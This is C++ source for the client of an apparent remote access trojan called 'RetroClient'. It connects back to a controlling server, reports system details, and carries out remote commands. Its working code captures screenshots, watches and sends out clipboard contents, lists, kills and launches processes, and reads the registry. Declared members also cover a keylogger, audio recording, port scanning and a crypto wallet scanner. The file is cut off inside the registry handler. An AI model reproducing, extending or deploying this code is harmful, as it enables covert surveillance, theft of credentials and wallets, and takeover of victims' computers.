
#include <iostream>
#include <string>
#include <thread>
#include <chrono>
#include <atomic>
#include <mutex>
#include <sstream>
#include <cstdlib>
#include <memory>
#include <fstream>
#include <vector>
#include <deque>
#include <filesystem>
#include <iomanip>
#include <ctime>
#include <algorithm>
#include "Functions.h"




// Platform-specific includes
#ifdef _WIN32
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <shellapi.h> 
#include <shlwapi.h>
#include <tlhelp32.h>
#include <shlobj.h>  // For SHGetFolderPath
#include <algorithm> 
#include <psapi.h>
#include <mmsystem.h>
#include <sapi.h> // For Text-to-Speech
#include <atlbase.h> // For CComPtr
#include <iphlpapi.h> // For network info
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "sapi.lib") // For Text-to-Speech
#pragma comment(lib, "iphlpapi.lib") // For network info
#define CLOSE_SOCKET closesocket
#define SOCKET_ERROR_CODE WSAGetLastError()
namespace fs = std::filesystem;
#else
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/stat.h>
#include <dirent.h>
#include <ifaddrs.h> // For network info
#define SOCKET int
#define INVALID_SOCKET -1
#define SOCKET_ERROR -1
#define CLOSE_SOCKET close
#define SOCKET_ERROR_CODE errno
namespace fs = std::filesystem;
#endif
#ifdef _WIN32
// ... existing includes ...
#include <iphlpapi.h>
#pragma comment(lib, "iphlpapi.lib")
#endif
#include <map>

// FIXED Base64 encoding/decoding with proper validation
static const std::string base64_chars =
"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
"abcdefghijklmnopqrstuvwxyz"
"0123456789+/";
std::string cpu_info;
std::string ram_info;

// Improved base64 encoding - ensures clean output
std::string base64_encode(const std::vector<unsigned char>& data) {
    std::string ret;
    int i = 0;
    unsigned char char_array_3[3];
    unsigned char char_array_4[4];

    size_t in_len = data.size();
    const unsigned char* bytes_to_encode = data.data();

    while (in_len--) {
        char_array_3[i++] = *(bytes_to_encode++);
        if (i == 3) {
            char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
            char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
            char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
            char_array_4[3] = char_array_3[2] & 0x3f;

            for (i = 0; (i < 4); i++)
                ret += base64_chars[char_array_4[i]];
            i = 0;
        }
    }

    if (i) {
        for (int j = i; j < 3; j++)
            char_array_3[j] = '\0';

        char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
        char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
        char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);

        for (int j = 0; (j < i + 1); j++)
            ret += base64_chars[char_array_4[j]];

        while ((i++ < 3))
            ret += '=';
    }

    return ret;
}

// Clean base64 string - remove any invalid characters
std::string cleanBase64(const std::string& input) {
    std::string cleaned;
    cleaned.reserve(input.length());

    for (char c : input) {
        if ((c >= 'A' && c <= 'Z') ||
            (c >= 'a' && c <= 'z') ||
            (c >= '0' && c <= '9') ||
            c == '+' || c == '/' || c == '=') {
            cleaned += c;
        }
    }

    return cleaned;
}

// Validate base64 string
bool isValidBase64(const std::string& str) {
    if (str.empty()) return false;

    for (char c : str) {
        if (!((c >= 'A' && c <= 'Z') ||
            (c >= 'a' && c <= 'z') ||
            (c >= '0' && c <= '9') ||
            c == '+' || c == '/' || c == '=')) {
            return false;
        }
    }

    // Check padding
    size_t padding = 0;
    for (size_t i = str.length(); i > 0 && str[i - 1] == '='; --i) {
        padding++;
    }

    return padding <= 2 && (str.length() % 4) == 0;
}

#ifdef _WIN32
LRESULT CALLBACK LockWndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
    case WM_CLOSE:
        // Prevent closing
        return 0;
    case WM_KEYDOWN:
        if (wParam == VK_ESCAPE) {
            DestroyWindow(hwnd);
            PostQuitMessage(0);
        }
        return 0;
    default:
        return DefWindowProc(hwnd, msg, wParam, lParam);
    }
}
#endif


std::vector<unsigned char> base64_decode(const std::string& encoded_string) {
    std::vector<unsigned char> ret;
    int in_len = encoded_string.size();
    int i = 0;
    int j = 0;
    int in_ = 0;
    unsigned char char_array_4[4], char_array_3[3];

    while (in_len-- && (encoded_string[in_] != '=')) {
        if (!isalnum(encoded_string[in_]) && encoded_string[in_] != '+' && encoded_string[in_] != '/') {
            in_++;
            continue;
        }

        char_array_4[i++] = encoded_string[in_];
        in_++;

        if (i == 4) {
            for (i = 0; i < 4; i++)
                char_array_4[i] = base64_chars.find(char_array_4[i]);

            char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
            char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
            char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

            for (i = 0; (i < 3); i++)
                ret.push_back(char_array_3[i]);
            i = 0;
        }
    }

    if (i) {
        for (j = i; j < 4; j++)
            char_array_4[j] = 0;

        for (j = 0; j < 4; j++)
            char_array_4[j] = base64_chars.find(char_array_4[j]);

        char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
        char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
        char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

        for (j = 0; (j < i - 1); j++) ret.push_back(char_array_3[j]);
    }

    return ret;
}


class RetroClient {

private:


    SOCKET sock;
    std::string server_host;
    int server_port;
    std::atomic<bool> should_run;
    std::atomic<bool> connected;
    std::atomic<bool> screenshot_active;
    std::thread keepalive_thread;
    std::thread receive_thread;
    std::thread screenshot_thread;
    std::mutex send_mutex;
    // Clipboard monitoring
    std::atomic<bool> clipboard_monitor_active;
    std::thread clipboard_monitor_thread;
    std::string last_clipboard_content;
    std::mutex clipboard_mutex;
    // Client info
    std::string hostname;
    std::string os_info;
    // Keylogger
    std::atomic<bool> keylog_active;
    std::thread keylog_thread;
    std::string keylog_buffer;
    std::mutex keylog_mutex;
    // Network monitoring
    std::atomic<bool> netstat_monitor_active;
    std::thread netstat_monitor_thread;
    std::mutex netstat_mutex;
    std::atomic<bool> port_scan_active;
    std::thread port_scan_thread;
    std::mutex port_scan_mutex;

    std::atomic<bool> audio_recording;
    std::thread audio_record_thread;
    std::string audio_filename;
    std::mutex audio_mutex;

    // Wallet scanner
    std::atomic<bool> wallet_scan_active;
    std::thread wallet_scan_thread;
    std::vector<std::string> found_wallets;
    std::mutex wallet_mutex;
#ifdef _WIN32
    static HHOOK keyboard_hook;
    static RetroClient* keylog_instance;
#endif
    // Screenshot settings
    int screenshot_quality = 2; // Default to medium quality

    // File upload handling
    std::string current_upload_filename;
    std::ofstream current_upload_file;
    int expected_chunks = 0;
    int received_chunks = 0;

    // File Manager
    std::string fm_upload_path;
    std::string fm_upload_filename;
    std::ofstream fm_upload_file;
    int fm_expected_chunks = 0;
    int fm_received_chunks = 0;

    std::atomic<bool> fm_search_active;
    std::thread fm_search_thread;

public:
    RetroClient(const std::string& host, int port)
        : sock(INVALID_SOCKET), server_host(host), server_port(port),
        should_run(true), connected(false), screenshot_active(false),
        clipboard_monitor_active(false), keylog_active(false),
        netstat_monitor_active(false), port_scan_active(false),
        audio_recording(false), wallet_scan_active(false) {

#ifdef _WIN32
        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
            throw std::runtime_error("WSAStartup failed");
        }
#endif

        getSystemInfo();
    }

    ~RetroClient() {
        shutdown();
#ifdef _WIN32
        WSACleanup();
#endif
    }


    void run() {
        std::cout << "[CLIENT] Starting connection to " << server_host << ":" << server_port << std::endl;

        while (should_run) {
            if (!connected) {
                if (connect_to_server()) {
                    std::cout << "[CLIENT] Connected successfully!" << std::endl;
                    sendInitialInfo();
                    startThreads();
                }
                else {
                    std::cout << "[CLIENT] Connection failed, retrying in 5 seconds..." << std::endl;
                    std::this_thread::sleep_for(std::chrono::seconds(5));
                    continue;
                }
            }

            std::this_thread::sleep_for(std::chrono::seconds(1));
        }
    }

    void shutdown() {
        should_run = false;
        connected = false;
        clipboard_monitor_active = false;
        netstat_monitor_active = false;
        audio_recording = false;
        wallet_scan_active = false;

        if (sock != INVALID_SOCKET) {
            CLOSE_SOCKET(sock);
            sock = INVALID_SOCKET;
        }

        if (keepalive_thread.joinable()) {
            keepalive_thread.join();
        }

        if (receive_thread.joinable()) {
            receive_thread.join();
        }

        if (screenshot_thread.joinable()) {
            screenshot_thread.join();
        }
        if (netstat_monitor_thread.joinable()) {  // ADD THIS
            netstat_monitor_thread.join();
        }

        if (port_scan_thread.joinable()) {  // ADD THIS
            port_scan_thread.join();
        }

        if (audio_record_thread.joinable()) {  // ADD THIS
            audio_record_thread.join();
        }
        if (wallet_scan_thread.joinable()) {  // ADD THIS
            wallet_scan_thread.join();
        }
    }

private:
    bool connect_to_server() {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == INVALID_SOCKET) {
            std::cerr << "[ERROR] Failed to create socket: " << SOCKET_ERROR_CODE << std::endl;
            return false;
        }

        // Set socket options
        int optval = 1;
#ifdef _WIN32
        setsockopt(sock, SOL_SOCKET, SO_KEEPALIVE, (char*)&optval, sizeof(optval));
        int nodelay = 1;
        setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (char*)&nodelay, sizeof(nodelay));
#else
        setsockopt(sock, SOL_SOCKET, SO_KEEPALIVE, &optval, sizeof(optval));
        int nodelay = 1;
        setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, &nodelay, sizeof(nodelay));
#endif

        struct sockaddr_in server_addr;
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(server_port);

        if (inet_pton(AF_INET, server_host.c_str(), &server_addr.sin_addr) <= 0) {
            std::cerr << "[ERROR] Invalid address: " << server_host << std::endl;
            CLOSE_SOCKET(sock);
            sock = INVALID_SOCKET;
            return false;
        }

        if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
            std::cerr << "[ERROR] Connection failed: " << SOCKET_ERROR_CODE << std::endl;
            CLOSE_SOCKET(sock);
            sock = INVALID_SOCKET;
            return false;
        }

        connected = true;
        return true;
    }



    void getSystemInfo() {
#ifdef _WIN32
        char buffer[256];
        DWORD size = sizeof(buffer);
        if (GetComputerNameA(buffer, &size)) {
            hostname = std::string(buffer);
        }
        else {
            hostname = "Unknown";
        }
        os_info = "Windows";

        // ADD THE NEW CODE RIGHT HERE - AFTER os_info = "Windows"; and BEFORE the #else

        // Get CPU info
        SYSTEM_INFO sysInfo;
        GetSystemInfo(&sysInfo);

        // Get memory info
        MEMORYSTATUSEX memInfo;
        memInfo.dwLength = sizeof(MEMORYSTATUSEX);
        GlobalMemoryStatusEx(&memInfo);

        cpu_info = "Cores: " + std::to_string(sysInfo.dwNumberOfProcessors);
        ram_info = std::to_string(memInfo.ullTotalPhys / (1024 * 1024 * 1024)) + "GB";

#else
        char buffer[256];
        if (gethostname(buffer, sizeof(buffer)) == 0) {
            hostname = std::string(buffer);
        }
        else {
            hostname = "Unknown";
        }
        os_info = "Linux/Unix";

        // ADD LINUX VERSION HERE - AFTER os_info = "Linux/Unix"; and BEFORE the #endif

        // Linux CPU info
        std::ifstream cpuinfo("/proc/cpuinfo");
        std::string line;
        int cpu_count = 0;
        while (std::getline(cpuinfo, line)) {
            if (line.find("processor") == 0) cpu_count++;
        }
        cpu_info = "Cores: " + std::to_string(cpu_count);

        // Linux memory info
        std::ifstream meminfo("/proc/meminfo");
        if (std::getline(meminfo, line)) {
            size_t pos = line.find_first_of("0123456789");
            if (pos != std::string::npos) {
                long memKB = std::stol(line.substr(pos));
                ram_info = std::to_string(memKB / (1024 * 1024)) + "GB";
            }
        }

#endif
    }

    void sendInitialInfo() {
        std::string info_msg = "{\"type\":\"info\",\"hostname\":\"" + hostname +
            "\",\"os\":\"" + os_info +
            "\",\"cpu\":\"" + cpu_info +
            "\",\"ram\":\"" + ram_info + "\"}\n";
        sendMessage(info_msg);
    }

    void startThreads() {
        // Start keepalive thread
        keepalive_thread = std::thread([this]() {
            while (should_run && connected) {
                std::this_thread::sleep_for(std::chrono::seconds(10));
                if (connected) {
                    sendMessage("{\"type\":\"keepalive\"}\n");
                }
            }
            });

        // Start receive thread
        receive_thread = std::thread([this]() {
            char buffer[8192];
            std::string message_buffer;

            while (should_run && connected) {
                int bytes_received = recv(sock, buffer, sizeof(buffer) - 1, 0);

                if (bytes_received <= 0) {
                    std::cout << "[CLIENT] Connection lost, attempting reconnect..." << std::endl;
                    connected = false;
                    CLOSE_SOCKET(sock);
                    sock = INVALID_SOCKET;
                    break;
                }

                buffer[bytes_received] = '\0';
                message_buffer += buffer;

                // Process complete messages (separated by newlines)
                size_t pos;
                while ((pos = message_buffer.find('\n')) != std::string::npos) {
                    std::string message = message_buffer.substr(0, pos);
                    message_buffer.erase(0, pos + 1);

                    if (!message.empty()) {
                        processMessage(message);
                    }
                }
            }
            });

        // Start screenshot thread - FIXED
        screenshot_thread = std::thread([this]() {
            while (should_run && connected) {
                if (screenshot_active) {
                    captureAndSendScreenshot();
                    std::this_thread::sleep_for(std::chrono::milliseconds(500)); // 2 FPS
                }
                else {
                    std::this_thread::sleep_for(std::chrono::milliseconds(100));
                }
            }
            });
    }

    void handleGetProcesses() {
        std::string processes_json = "{\"type\":\"processes_list\",\"processes\":[";

#ifdef _WIN32
        // Use tasklist command instead of Windows API
        FILE* pipe = _popen("tasklist /FO CSV /NH", "r");
        if (pipe) {
            char buffer[512];
            bool first = true;

            while (fgets(buffer, sizeof(buffer), pipe)) {
                std::string line(buffer);

                // Parse CSV: "Image Name","PID","Session Name","Session#","Mem Usage"
                std::vector<std::string> fields;
                std::string current;
                bool in_quotes = false;

                for (char c : line) {
                    if (c == '"') {
                        in_quotes = !in_quotes;
                    }
                    else if (c == ',' && !in_quotes) {
                        fields.push_back(current);
                        current.clear();
                    }
                    else if (c != '\r' && c != '\n') {
                        current += c;
                    }
                }
                if (!current.empty()) {
                    fields.push_back(current);
                }

                if (fields.size() >= 5) {
                    if (!first) processes_json += ",";
                    first = false;

                    std::string name = fields[0];
                    std::string pid = fields[1];
                    std::string mem_str = fields[4];

                    // Clean memory string (remove "K" and commas)
                    mem_str.erase(std::remove(mem_str.begin(), mem_str.end(), ','), mem_str.end());
                    mem_str.erase(std::remove(mem_str.begin(), mem_str.end(), ' '), mem_str.end());
                    size_t k_pos = mem_str.find('K');
                    if (k_pos != std::string::npos) {
                        mem_str = mem_str.substr(0, k_pos);
                    }

                    size_t mem_kb = 0;
                    try {
                        mem_kb = std::stoull(mem_str);
                    }
                    catch (...) {}

                    processes_json += "{\"pid\":" + pid +
                        ",\"name\":\"" + escapeJsonString(name) +
                        "\",\"memory\":" + std::to_string(mem_kb) +
                        ",\"threads\":0}";
                }
            }
            _pclose(pipe);
        }
#else
        // Linux version - parse /proc
        DIR* proc_dir = opendir("/proc");
        if (proc_dir) {
            struct dirent* entry;
            bool first = true;

            while ((entry = readdir(proc_dir)) != NULL) {
                std::string pid_str = entry->d_name;
                if (std::all_of(pid_str.begin(), pid_str.end(), ::isdigit)) {
                    std::string stat_path = "/proc/" + pid_str + "/stat";
                    std::ifstream stat_file(stat_path);
                    if (stat_file) {
                        std::string stat_line;
                        std::getline(stat_file, stat_line);

                        size_t start = stat_line.find('(');
                        size_t end = stat_line.rfind(')');
                        if (start != std::string::npos && end != std::string::npos) {
                            std::string proc_name = stat_line.substr(start + 1, end - start - 1);

                            std::string status_path = "/proc/" + pid_str + "/status";
                            std::ifstream status_file(status_path);
                            size_t vmrss = 0;
                            std::string line;
                            while (std::getline(status_file, line)) {
                                if (line.find("VmRSS:") == 0) {
                                    std::istringstream iss(line);
                                    std::string label;
                                    iss >> label >> vmrss;
                                    break;
                                }
                            }

                            if (!first) processes_json += ",";
                            first = false;

                            processes_json += "{\"pid\":" + pid_str +
                                ",\"name\":\"" + escapeJsonString(proc_name) +
                                "\",\"memory\":" + std::to_string(vmrss) +
                                ",\"threads\":0}";
                        }
                    }
                }
            }
            closedir(proc_dir);
        }
#endif

        processes_json += "]}\n";
        sendMessage(processes_json);
    }

    void handleKillProcess(const std::string& message) {
        // Extract PID from message
        size_t pid_start = message.find("\"pid\":");
        if (pid_start == std::string::npos) return;

        pid_start += 6;
        size_t pid_end = message.find_first_of(",}", pid_start);
        int pid = std::stoi(message.substr(pid_start, pid_end - pid_start));

        bool success = false;
        std::string error_msg;

#ifdef _WIN32
        HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
        if (hProcess) {
            success = TerminateProcess(hProcess, 0);
            if (!success) {
                error_msg = "Failed to terminate process";
            }
            CloseHandle(hProcess);
        }
        else {
            error_msg = "Failed to open process";
        }
#else
        if (kill(pid, SIGKILL) == 0) {
            success = true;
        }
        else {
            error_msg = "Failed to kill process";
        }
#endif

        std::string response = "{\"type\":\"process_kill_result\",\"success\":" +
            std::string(success ? "true" : "false") +
            ",\"pid\":" + std::to_string(pid);

        if (!success) {
            response += ",\"error\":\"" + error_msg + "\"";
        }

        response += "}\n";
        sendMessage(response);
    }

    void handleSearchProcess(const std::string& message) {
        // Extract search term
        size_t term_start = message.find("\"term\":\"");
        if (term_start == std::string::npos) return;

        term_start += 8;
        size_t term_end = message.find("\"", term_start);
        std::string search_term = message.substr(term_start, term_end - term_start);

        // Convert to lowercase for case-insensitive search
        std::transform(search_term.begin(), search_term.end(), search_term.begin(), ::tolower);

        // Get all processes and filter
        // Reuse the process listing code but filter by name
        std::string processes_json = "{\"type\":\"process_search_result\",\"term\":\"" +
            escapeJsonString(search_term) + "\",\"processes\":[";

        // Similar to handleGetProcesses but with filtering
        // Add only processes where name contains search_term

        processes_json += "]}\n";
        sendMessage(processes_json);
    }

    void handleStartProcess(const std::string& message) {
        size_t path_start = message.find("\"path\":\"");
        size_t args_start = message.find("\"args\":\"");

        if (path_start == std::string::npos) return;

        path_start += 8;
        size_t path_end = message.find("\"", path_start);
        std::string path = message.substr(path_start, path_end - path_start);
        path = unescapeJsonString(path);

        std::string args = "";
        if (args_start != std::string::npos) {
            args_start += 8;
            size_t args_end = message.find("\"", args_start);
            args = message.substr(args_start, args_end - args_start);
            args = unescapeJsonString(args);
        }

        bool success = false;
        std::string error_msg;

#ifdef _WIN32
        STARTUPINFOA si = { 0 };
        PROCESS_INFORMATION pi = { 0 };
        si.cb = sizeof(si);

        std::string cmdline = "\"" + path + "\"";
        if (!args.empty()) {
            cmdline += " " + args;
        }

        if (CreateProcessA(NULL, (LPSTR)cmdline.c_str(), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
            success = true;
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
        else {
            error_msg = "Failed to create process";
        }
#else
        // Linux fork/exec
        pid_t pid = fork();
        if (pid == 0) {
            // Child process
            execl(path.c_str(), path.c_str(), args.c_str(), NULL);
            exit(1); // If exec fails
        }
        else if (pid > 0) {
            success = true;
        }
        else {
            error_msg = "Fork failed";
        }
#endif

        std::string response = "{\"type\":\"process_start_result\",\"success\":" +
            std::string(success ? "true" : "false");
        if (!success) {
            response += ",\"error\":\"" + error_msg + "\"";
        }
        response += "}\n";
        sendMessage(response);
    }

    void handleSetProcessPriority(const std::string& message) {
        size_t pid_start = message.find("\"pid\":");
        size_t priority_start = message.find("\"priority\":\"");

        if (pid_start == std::string::npos || priority_start == std::string::npos) return;

        pid_start += 6;
        size_t pid_end = message.find_first_of(",}", pid_start);
        int pid = std::stoi(message.substr(pid_start, pid_end - pid_start));

        priority_start += 12;
        size_t priority_end = message.find("\"", priority_start);
        std::string priority = message.substr(priority_start, priority_end - priority_start);

        bool success = false;

#ifdef _WIN32
        HANDLE hProcess = OpenProcess(PROCESS_SET_INFORMATION, FALSE, pid);
        if (hProcess) {
            DWORD priorityClass = NORMAL_PRIORITY_CLASS;
            if (priority == "high") priorityClass = HIGH_PRIORITY_CLASS;
            else if (priority == "low") priorityClass = IDLE_PRIORITY_CLASS;
            else if (priority == "realtime") priorityClass = REALTIME_PRIORITY_CLASS;

            success = SetPriorityClass(hProcess, priorityClass);
            CloseHandle(hProcess);
        }
#else
        // Linux: use nice/renice
        int nice_value = 0;
        if (priority == "high") nice_value = -10;
        else if (priority == "low") nice_value = 10;

        std::string cmd = "renice " + std::to_string(nice_value) + " -p " + std::to_string(pid);
        success = (system(cmd.c_str()) == 0);
#endif

        std::string response = "{\"type\":\"process_priority_result\",\"success\":" +
            std::string(success ? "true" : "false") + "}\n";
        sendMessage(response);
    }
    void handleGetProcessDetails(const std::string& message) {
        size_t pid_start = message.find("\"pid\":");
        if (pid_start == std::string::npos) return;

        pid_start += 6;
        size_t pid_end = message.find_first_of(",}", pid_start);
        int pid = std::stoi(message.substr(pid_start, pid_end - pid_start));

        std::string details_json = "{\"type\":\"process_details\",\"pid\":" + std::to_string(pid);

#ifdef _WIN32
        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
        if (hProcess) {
            // Get process path
            char path[MAX_PATH];
            if (GetModuleFileNameExA(hProcess, NULL, path, MAX_PATH)) {
                details_json += ",\"path\":\"" + escapeJsonString(path) + "\"";
            }

            // Get process times
            FILETIME createTime, exitTime, kernelTime, userTime;
            if (GetProcessTimes(hProcess, &createTime, &exitTime, &kernelTime, &userTime)) {
                // Convert FILETIME to readable format
                SYSTEMTIME st;
                FileTimeToSystemTime(&createTime, &st);
                char timeStr[64];
                sprintf(timeStr, "%02d/%02d/%d %02d:%02d:%02d",
                    st.wMonth, st.wDay, st.wYear, st.wHour, st.wMinute, st.wSecond);
                details_json += ",\"start_time\":\"" + std::string(timeStr) + "\"";
            }

            CloseHandle(hProcess);
        }
#else
        // Linux: read from /proc/[pid]/
        std::string cmdline_path = "/proc/" + std::to_string(pid) + "/cmdline";
        std::ifstream cmdline_file(cmdline_path);
        if (cmdline_file) {
            std::string cmdline;
            std::getline(cmdline_file, cmdline, '\0');
            details_json += ",\"path\":\"" + escapeJsonString(cmdline) + "\"";
        }
#endif

        details_json += "}\n";
        sendMessage(details_json);
    }

    void handleGetClipboard() {
        std::string clipboard_data = "";

#ifdef _WIN32
        if (OpenClipboard(NULL)) {
            HANDLE hData = GetClipboardData(CF_TEXT);
            if (hData) {
                char* pszText = static_cast<char*>(GlobalLock(hData));
                if (pszText) {
                    clipboard_data = pszText;
                    GlobalUnlock(hData);
                }
            }

            // Also check for Unicode text
            if (clipboard_data.empty()) {
                hData = GetClipboardData(CF_UNICODETEXT);
                if (hData) {
                    wchar_t* pwszText = static_cast<wchar_t*>(GlobalLock(hData));
                    if (pwszText) {
                        // Convert wide string to narrow string
                        int size = WideCharToMultiByte(CP_UTF8, 0, pwszText, -1, NULL, 0, NULL, NULL);
                        if (size > 0) {
                            std::vector<char> buffer(size);
                            WideCharToMultiByte(CP_UTF8, 0, pwszText, -1, buffer.data(), size, NULL, NULL);
                            clipboard_data = buffer.data();
                        }
                        GlobalUnlock(hData);
                    }
                }
            }
            CloseClipboard();
        }
#else
        // Linux: use xclip or xsel command
        FILE* pipe = popen("xclip -selection clipboard -o 2>/dev/null || xsel --clipboard --output 2>/dev/null", "r");
        if (pipe) {
            char buffer[256];
            while (fgets(buffer, sizeof(buffer), pipe)) {
                clipboard_data += buffer;
            }
            pclose(pipe);
        }
#endif

        std::string response = "{\"type\":\"clipboard_data\",\"data\":\"" +
            escapeJsonString(clipboard_data) + "\"}\n";
        sendMessage(response);
    }

    void handleSetClipboard(const std::string& message) {
        size_t data_start = message.find("\"data\":\"");
        if (data_start == std::string::npos) return;

        data_start += 8;
        size_t data_end = message.find("\"", data_start);
        std::string data = message.substr(data_start, data_end - data_start);
        data = unescapeJsonString(data);

        bool success = false;

#ifdef _WIN32
        if (OpenClipboard(NULL)) {
            EmptyClipboard();

            size_t len = data.length() + 1;
            HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, len);
            if (hMem) {
                char* pMem = static_cast<char*>(GlobalLock(hMem));
                if (pMem) {
                    strcpy_s(pMem, len, data.c_str());
                    GlobalUnlock(hMem);

                    if (SetClipboardData(CF_TEXT, hMem)) {
                        success = true;
                    }
                    else {
                        GlobalFree(hMem);
                    }
                }
            }
            CloseClipboard();
        }
#else
        // Linux: use xclip or xsel
        FILE* pipe = popen("xclip -selection clipboard 2>/dev/null || xsel --clipboard --input 2>/dev/null", "w");
        if (pipe) {
            fputs(data.c_str(), pipe);
            success = (pclose(pipe) == 0);
        }
#endif

        std::string response = "{\"type\":\"clipboard_set_result\",\"success\":" +
            std::string(success ? "true" : "false") + "}\n";
        sendMessage(response);
    }

    void handleStartClipboardMonitor() {
        if (clipboard_monitor_active) return;

        clipboard_monitor_active = true;

        // Get initial clipboard content
        getClipboardContent(last_clipboard_content);

        clipboard_monitor_thread = std::thread([this]() {
            while (clipboard_monitor_active && connected) {
                std::string current_content;
                if (getClipboardContent(current_content)) {
                    std::lock_guard<std::mutex> lock(clipboard_mutex);

                    if (current_content != last_clipboard_content && !current_content.empty()) {
                        // Clipboard changed, send update
                        std::string notification = "{\"type\":\"clipboard_changed\",\"data\":\"" +
                            escapeJsonString(current_content) +
                            "\",\"timestamp\":" + std::to_string(time(nullptr)) + "}\n";
                        sendMessage(notification);

                        last_clipboard_content = current_content;
                    }
                }

                std::this_thread::sleep_for(std::chrono::seconds(1)); // Check every second
            }
            });

        std::string response = "{\"type\":\"clipboard_monitor_status\",\"active\":true}\n";
        sendMessage(response);
    }

    void handleStopClipboardMonitor() {
        clipboard_monitor_active = false;

        if (clipboard_monitor_thread.joinable()) {
            clipboard_monitor_thread.join();
        }

        std::string response = "{\"type\":\"clipboard_monitor_status\",\"active\":false}\n";
        sendMessage(response);
    }

    // Helper function to get clipboard content
    bool getClipboardContent(std::string& content) {
        content.clear();

#ifdef _WIN32
        if (OpenClipboard(NULL)) {
            HANDLE hData = GetClipboardData(CF_TEXT);
            if (hData) {
                char* pszText = static_cast<char*>(GlobalLock(hData));
                if (pszText) {
                    content = pszText;
                    GlobalUnlock(hData);
                }
            }

            // Also check Unicode if no ANSI text
            if (content.empty()) {
                hData = GetClipboardData(CF_UNICODETEXT);
                if (hData) {
                    wchar_t* pwszText = static_cast<wchar_t*>(GlobalLock(hData));
                    if (pwszText) {
                        int size = WideCharToMultiByte(CP_UTF8, 0, pwszText, -1, NULL, 0, NULL, NULL);
                        if (size > 0) {
                            std::vector<char> buffer(size);
                            WideCharToMultiByte(CP_UTF8, 0, pwszText, -1, buffer.data(), size, NULL, NULL);
                            content = buffer.data();
                        }
                        GlobalUnlock(hData);
                    }
                }
            }
            CloseClipboard();
            return true;
        }
#else
        FILE* pipe = popen("xclip -selection clipboard -o 2>/dev/null || xsel --clipboard --output 2>/dev/null", "r");
        if (pipe) {
            char buffer[256];
            while (fgets(buffer, sizeof(buffer), pipe)) {
                content += buffer;
            }
            pclose(pipe);
            return true;
        }
#endif

        return false;
    }

#ifdef _WIN32
    HKEY parseRegistryHive(const std::string& hive) {
        if (hive == "HKLM" || hive == "HKEY_LOCAL_MACHINE") return HKEY_LOCAL_MACHINE;
        if (hive == "HKCU" || hive == "HKEY_CURRENT_USER") return HKEY_CURRENT_USER;
        if (hive == "HKCR" || hive == "HKEY_CLASSES_ROOT") return HKEY_CLASSES_ROOT;
        if (hive == "HKU" || hive == "HKEY_USERS") return HKEY_USERS;
        if (hive == "HKCC" || hive == "HKEY_CURRENT_CONFIG") return HKEY_CURRENT_CONFIG;
        return NULL;
    }
#endif

    void handleRegistryRead(const std::string& message) {
#ifdef _WIN32
        // Extract hive, key path, and value name
        size_t hive_start = message.find("\"hive\":\"");
        size_t key_start = message.find("\"key\":\"");
        size_t value_start = message.find("\"value\":\"");

        if (hive_start == std::string::npos || key_start == std::string::npos) {
            sendRegistryError("Missing hive or key");
            return;
        }

        hive_start += 8;
        size_t hive_end = message.find("\"", hive_start);
        std::string hive_str = message.substr(hive_start, hive_end - hive_start);

        key_start += 7;
        size_t key_end = message.find("\"", key_start);
        std::string key_path = message.substr(key_start, key_end - key_start);
        key_path = unescapeJsonString(key_path);

        std::string value_name = "";
        if (value_start != std::string::npos) {
            value_start += 9;
            size_t value_end = message.find("\"", value_start);
            value_name = message.substr(value_start, value_end - value_start);
            value_name = unescapeJsonString(value_name);
        }

        HKEY hive = parseRegistryHive(hive_str);
        if (!hive) {
            sendRegistryError("Invalid hive");
            return;
        }

        HKEY hKey;
        if (RegOpenKeyExA(hive, key_path.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            if (value_name.empty()) {
                // Read default value
                value_name = "";
            }

            DWORD type;
            DWORD size = 0;

            // First get the size
            if (RegQueryValueExA(hKey, value_name.c_str(), NULL, &type, NULL, &size) == ERROR_SUCCESS) {
                std::vector<BYTE> buffer(size);

                if (RegQueryValueExA(hKey, value_name.c_str(), NULL, &type, buffer.data(), &size) == ERROR_SUCCESS) {
                    std::string response = "{\"type\":\"registry_read_result\",\"success\":true";
                    response += ",\"value_type\":\"";

                    // Add type
                    switch (type) {
                    case REG_SZ: response += "REG_SZ"; break;
                    case REG_DWORD: response += "REG_DWORD"; break;
                    case REG_BINARY: response += "REG_BINARY"; break;
